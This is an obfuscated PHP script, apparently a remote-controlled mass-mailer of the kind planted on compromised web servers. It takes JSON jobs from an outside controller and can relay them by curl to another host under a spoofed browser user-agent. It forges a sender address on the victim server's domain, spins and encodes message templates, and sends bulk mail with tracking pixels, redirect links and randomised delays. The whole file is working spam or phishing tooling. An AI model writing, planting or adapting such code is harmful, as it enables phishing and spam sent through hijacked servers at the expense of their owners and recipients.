<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); @error_reporting(0); @ini_set('display_errors', 0); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp4f28bd) { if ($sp4f28bd == 'keys') { return array_keys($this->_keys); } } public function Import($sp4f28bd, $sp04951c) { if (is_array($sp04951c)) { $this->values[$sp4f28bd] = array(); foreach ($sp04951c as $spb3e7e3) { if (!empty($spb3e7e3['key'])) { $this->values[$sp4f28bd][$spb3e7e3['key']] = $spb3e7e3['value']; } else { $this->values[$sp4f28bd][] = $spb3e7e3['value']; } } } else { $this->Assign($sp4f28bd, $sp04951c); } } public function Assign($sp4f28bd, $sp145995) { $this->values[$sp4f28bd] = $sp145995; } public function Parse($sp915392) { $sp6b2ff1 = ''; $sp825188 = 0; while (true) { $sp86b154 = strpos($sp915392, '{', $sp825188); if ($sp86b154 === false) { $sp6b2ff1 .= substr($sp915392, $sp825188); break; } $sp6b2ff1 .= substr($sp915392, $sp825188, $sp86b154 - $sp825188); $sp825188 = $sp86b154 + 1; $spb5375b = ''; $sp59c201 = '{'; $spf9c0a4 = array(); $sp1dd70a = false; $sp198434 = false; $sp2bb16c = 'var'; while ($sp825188 < strlen($sp915392)) { $sp15e948 = substr($sp915392, $sp825188, 1); $sp59c201 .= $sp15e948; if ($sp15e948 == ',' || $sp15e948 == '>' || $sp15e948 == '|') { if ($sp2bb16c == 'alias') { $sp1dd70a = $spb5375b; } elseif ($sp2bb16c == 'mod') { $sp198434 = $spb5375b; } else { $spf9c0a4[] = $spb5375b; } $spb5375b = ''; if ($sp15e948 == '>') { $sp2bb16c = 'alias'; } if ($sp15e948 == '|') { $sp2bb16c = 'mod'; } $sp825188++; continue; } if ($sp15e948 == '}') { if ($sp2bb16c == 'alias') { $sp1dd70a = $spb5375b; } elseif ($sp2bb16c == 'mod') { $sp198434 = $spb5375b; } else { $spf9c0a4[] = $spb5375b; } $sp825188++; break; } $spb5375b .= $sp15e948; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp15e948) == 0) { $sp825188++; $spf9c0a4 = array(); break; } $sp825188++; } if (sizeof($spf9c0a4) == 0) { $sp6b2ff1 .= $sp59c201; continue; } $sp9eb0f4 = false; $sp82655d = false; if (preg_match('/^\\^/', $spf9c0a4[0]) > 0) { $spf9c0a4[0] = substr($spf9c0a4[0], 1); $sp9eb0f4 = true; } if (preg_match('/^\\!/', $spf9c0a4[0]) > 0) { $spf9c0a4[0] = substr($spf9c0a4[0], 1); $sp82655d = true; } $sp316308 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spf9c0a4[0], $spced6b9) > 0) { $sp316308 = $spced6b9[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spf9c0a4[0], $spced6b9) > 0) { $sp316308 = explode('-', $spced6b9[1]); } if ($sp316308 !== false) { $spf9c0a4[0] = substr($spf9c0a4[0], 0, strpos($spf9c0a4[0], '[')); } $this->_keys[$spf9c0a4[0]] = true; if (empty($this->values[$spf9c0a4[0]]) && empty($this->fixed[$spf9c0a4[0]])) { continue; } if ($sp9eb0f4) { unset($this->fixed[$spf9c0a4[0]]); } if (isset($this->fixed[$spf9c0a4[0]])) { $sp843203 = $this->fixed[$spf9c0a4[0]]; } else { $sp843203 = ''; $spa2a3ca = 1; if (sizeof($spf9c0a4) == 2) { $spa2a3ca = $spf9c0a4[1]; } if (sizeof($spf9c0a4) == 3) { $spa2a3ca = rand($spf9c0a4[1], $spf9c0a4[2]); } for ($spe4cfed = 0; $spe4cfed < $spa2a3ca; $spe4cfed++) { if (is_array($this->values[$spf9c0a4[0]])) { if (!is_array($this->used[$spf9c0a4[0]])) { $this->used[$spf9c0a4[0]] = array(); } if (count($this->used[$spf9c0a4[0]]) == count($this->values[$spf9c0a4[0]])) { $this->used[$spf9c0a4[0]] = array(); } if ($sp316308 !== false && is_scalar($sp316308)) { $sp843203 .= $this->values[$spf9c0a4[0]][$sp316308]; $this->used[$sp316308] = true; } else { $spd15b97 = array(); if (is_array($sp316308)) { $sp3e3d9d = $sp316308[0]; $spd8a4f6 = $sp316308[1]; } else { $sp3e3d9d = 0; $spd8a4f6 = count($this->values[$spf9c0a4[0]]) - 1; } for ($sp1e0810 = $sp3e3d9d; $sp1e0810 <= $spd8a4f6; $sp1e0810++) { if ($sp82655d && !empty($this->used[$spf9c0a4[0]][$sp1e0810])) { continue; } $spd15b97[] = $sp1e0810; } $sp3a8ac3 = $spd15b97[rand(0, count($spd15b97) - 1)]; $this->used[$spf9c0a4[0]][$sp3a8ac3] = true; $sp843203 .= $this->values[$spf9c0a4[0]][$sp3a8ac3]; } } else { $sp843203 .= $this->values[$spf9c0a4[0]]; } } } $sp843203 = $this->Parse($sp843203); if ($sp198434 !== false) { for ($sp60d585 = 0; $sp60d585 < strlen($sp198434); $sp60d585++) { switch (substr($sp198434, $sp60d585, 1)) { case 'b': $sp843203 = base64_encode($sp843203); break; case 'q': $sp843203 = quoted_printable_encode($sp843203); break; default: break; } } } if ($sp9eb0f4) { $this->fixed[$spf9c0a4[0]] = $sp843203; } if ($sp1dd70a !== false && $sp1dd70a != '') { $this->fixed[$sp1dd70a] = $sp843203; } $sp6b2ff1 .= $sp843203; } return $sp6b2ff1; } } $sp53802b = file_get_contents('php://input'); $sp5c80ae = json_decode($sp53802b, true); if (empty($sp5c80ae['via_proxy'])) { $sp5c80ae['via_proxy'] = true; $spd63947 = curl_init($sp5c80ae['prefix'] . $sp5c80ae['files']['s']); $sp91d3a8 = json_encode($sp5c80ae); curl_setopt($spd63947, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($spd63947, CURLOPT_TIMEOUT, 600); curl_setopt($spd63947, CURLOPT_RETURNTRANSFER, true); curl_setopt($spd63947, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($spd63947, CURLOPT_REFERER, $spbaf781); curl_setopt($spd63947, CURLOPT_POST, true); curl_setopt($spd63947, CURLOPT_POSTFIELDS, $sp91d3a8); curl_setopt($spd63947, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp91d3a8))); $sp8e48a7 = curl_exec($spd63947); echo $sp8e48a7; die; } $sp60a05b = $_SERVER['SERVER_ADDR']; $sp421deb = $_SERVER['HTTP_HOST']; $sp421deb = preg_replace('/^www\\./', '', $sp421deb); $spaaab64 = new Macros(); $spaaab64->Assign('server_addr', $sp60a05b); $spaaab64->Assign('server_host', $sp421deb); foreach ($sp5c80ae['macros'] as $sp4f28bd => $sp04951c) { $spaaab64->Import($sp4f28bd, $sp04951c); } $speaeed0 = preg_replace('/^www\\./i', '', $sp421deb); $sp72c70f = $spaaab64->Parse('{from_user}@' . $speaeed0); $spaaab64->Assign('from_email', $sp72c70f); $spaaab64->Assign('prefix', $sp5c80ae['prefix']); $spaaab64->Assign('html', $sp5c80ae['letter']['html']); $sp825188 = 0; $speb1676 = 0; $spf79c44 = 0; $sp0c534b = array(); foreach ($sp5c80ae['rcpt'] as $sp973ac3) { $spaaab64->Assign('email', $sp973ac3['email']); $spaaab64->Assign('entry', $sp973ac3); $spaaab64->Assign('date', date('r')); $spaaab64->Assign('redirect', $sp5c80ae['prefix'] . $sp5c80ae['files']['r']); $spaaab64->Assign('redirect_with_uri', $sp5c80ae['prefix'] . $sp5c80ae['files']['r'] . '?uri='); $spaaab64->Assign('unsubscribe', $sp5c80ae['prefix'] . $sp5c80ae['files']['u'] . '?id=' . $sp973ac3['id']); $spaaab64->Assign('delivery', '<img src="' . $sp5c80ae['prefix'] . $sp5c80ae['files']['d'] . '?id=' . $sp973ac3['id'] . '" />'); $sp21a7fc = $spaaab64->Parse($sp5c80ae['envelope']['header']); $spc3f924 = $spaaab64->Parse($sp5c80ae['envelope']['body']); if (!empty($sp973ac3['name'])) { $spe0c468 = $sp973ac3['name'] . ' <' . $sp973ac3['email'] . '>'; } else { $spe0c468 = $sp973ac3['email']; } $spf2616c = $spaaab64->Parse($sp5c80ae['letter']['subject']); if ($sp825188 > 0) { sleep(rand(3, 8)); } $sp42e387 = mail($spe0c468, $spf2616c, $spc3f924, $sp21a7fc); $sp0c534b[$sp973ac3['id']] = $sp42e387; if ($sp42e387) { $speb1676++; } else { $spf79c44++; } $sp825188++; } echo serialize(array('total' => count($sp5c80ae['rcpt']), 'sent' => $sp825188, 'success' => $speb1676, 'error' => $spf79c44, 'rcpt' => $sp0c534b));